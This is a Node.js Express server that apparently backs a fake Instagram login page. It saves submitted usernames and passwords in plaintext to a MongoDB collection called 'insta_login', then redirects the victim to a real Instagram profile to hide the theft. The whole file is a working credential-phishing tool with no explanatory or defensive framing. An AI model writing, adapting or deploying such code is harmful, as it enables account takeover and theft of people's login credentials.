const express = require("express");
const mongoose = require("mongoose");
const bodyParser = require("body-parser");
const dotenv = require("dotenv");
const path = require("path");
const cors = require("cors");

const app = express();

dotenv.config();

const port = process.env.PORT || 3000;

// Middleware to serve static files
app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: true })); // To handle form submissions


const username = process.env.MONGODB_USERNAME;
const password = process.env.MONGODB_PASSWORD;

mongoose.connect(`mongodb+srv://${username}:${password}@cluster0.e1efv.mongodb.net/insta_login`, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
});

const registrationSchema = new mongoose.Schema({
    name: String,
    password: String
});

const Registration = mongoose.model("Registration", registrationSchema);

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html")); 
});

app.post("/register", async (req, res) => {
    try {
        const { username, password } = req.body; // Use 'username' as the field name
        const registrationData = new Registration({
            name: username, 
            password: password
        });
        await registrationData.save();
        res.redirect("https://www.instagram.com/mahi7781/?hl=en");
    } catch (error) {
        console.log(error);
        res.status(500).send("Server Error",error);
    }
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
